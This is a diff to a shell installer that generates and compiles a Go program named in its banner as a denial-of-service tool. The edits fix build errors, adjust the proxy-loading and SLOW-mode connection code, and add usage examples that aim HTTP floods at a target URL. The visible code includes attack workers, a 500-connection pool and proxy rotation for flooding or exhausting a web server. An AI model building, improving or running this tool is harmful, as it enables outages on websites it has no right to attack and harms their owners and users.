@@ -23,19 +23,15 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (since GitHub raw might not work)
+# Create main.go file directly (fixed version with no unused imports)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
-	"context"
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/base64"
-	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/big"
@@ -43,7 +39,6 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
 	"os/signal"
 	"runtime"
 	"strconv"
@@ -278,16 +273,9 @@ func (p *ConnectionPool) CloseIdleConnections() {
 	}
 }
 
-func detectProtocols(target string) []string {
-	u, err := url.Parse(target)
-	if err != nil {
-		return []string{"h1"}
-	}
-	return []string{"h1", "h2"}
-}
-
 func loadProxiesFromAPI() {
-	resp, err := http.Get(proxyAPI)
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(proxyAPI)
 	if err != nil {
 		return
 	}
@@ -312,6 +300,9 @@ func loadProxiesFromAPI() {
 	proxyMu.Unlock()
 
 	atomic.StoreUint64(&proxyIndex, 0)
+	if len(proxies) > 0 {
+		fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
+	}
 }
 
 func proxyRefresher() {
@@ -441,7 +432,14 @@ func main() {
 
 	if len(os.Args) < 4 {
 		printBanner()
-		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
+		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
+		fmt.Println("")
+		fmt.Println("Examples:")
+		fmt.Println("  ./main https://target.com 60 GET")
+		fmt.Println("  ./main https://target.com 120 POST")
+		fmt.Println("  ./main https://target.com 30 HEAD")
+		fmt.Println("  ./main https://target.com 60 SLOW")
+		fmt.Println("  ./main https://target.com 60 GET proxy")
 		os.Exit(1)
 	}
 
@@ -455,14 +453,14 @@ func main() {
 		os.Exit(1)
 	}
 
-	u, err := url.Parse(target)
-	if err != nil || u.Scheme == "" || u.Host == "" {
+	_, err := url.Parse(target)
+	if err != nil || !strings.HasPrefix(target, "http") {
 		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
 			target = "http://" + target
 		} else if !strings.HasPrefix(target, "http") {
 			target = "https://" + target
 		}
-		u, err = url.Parse(target)
+		_, err = url.Parse(target)
 		if err != nil {
 			fmt.Println("Invalid target URL:", err)
 			os.Exit(1)
@@ -476,8 +474,6 @@ func main() {
 	}
 	duration := time.Duration(durationSec) * time.Second
 
-	protocols := detectProtocols(target)
-
 	printBanner()
 	fmt.Printf("[+] Target: %s\n", target)
 	fmt.Printf("[+] Mode: %s\n", mode)
@@ -486,10 +482,10 @@ func main() {
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
-	fmt.Println("[+] Starting... Ctrl+C to stop")
+	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 
 	poolSize := 500
-	connectionPool := NewConnectionPool(poolSize, useProxy, u.Host)
+	connectionPool := NewConnectionPool(poolSize, useProxy, "")
 
 	var wg sync.WaitGroup
 	done := make(chan struct{})
@@ -514,7 +510,7 @@ func main() {
 		wg.Add(1)
 		go func(id int) {
 			defer wg.Done()
-			attackWorker(target, u.Host, mode, done, stats, useProxy, connectionPool)
+			attackWorker(target, mode, done, stats, useProxy, connectionPool)
 		}(i)
 	}
 
@@ -555,7 +551,7 @@ func (c *atomicCounter) get() int64 {
 	return atomic.LoadInt64(&c.val)
 }
 
-func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
+func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
 	for {
 		select {
 		case <-done:
@@ -581,7 +577,9 @@ func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCo
 			var err error
 
 			if mode == "SLOW" {
-				conn, err := net.DialTimeout("tcp", host, 5*time.Second)
+				u, _ := url.Parse(target)
+				host := u.Hostname()
+				conn, err := net.DialTimeout("tcp", host+":80", 5*time.Second)
 				if err != nil {
 					time.Sleep(200 * time.Millisecond)
 					continue
@@ -747,8 +745,6 @@ echo
 # Download dependencies
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
 go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
-go get golang.org/x/crypto@v0.22.0 > /dev/null 2>&1
-go get golang.org/x/sys@v0.19.0 > /dev/null 2>&1
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
@@ -784,6 +780,13 @@ if [ $BUILD_EXIT_CODE -eq 0 ]; then
     echo
     echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]${NC}"
     echo
+    echo -e " ${GREEN}Examples:${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 60 GET${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 120 POST${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 30 HEAD${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
+    echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
+    echo
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
@@ -796,10 +799,8 @@ else
     echo
     echo -e "   ${BLUE}1.${NC} go mod init main"
     echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
-    echo -e "   ${BLUE}3.${NC} go get golang.org/x/crypto@v0.22.0"
-    echo -e "   ${BLUE}4.${NC} go get golang.org/x/sys@v0.19.0"
-    echo -e "   ${BLUE}5.${NC} go mod tidy"
-    echo -e "   ${BLUE}6.${NC} go build -o main main.go"
+    echo -e "   ${BLUE}3.${NC} go mod tidy"
+    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
     echo
     rm -f main.go
     exit 1
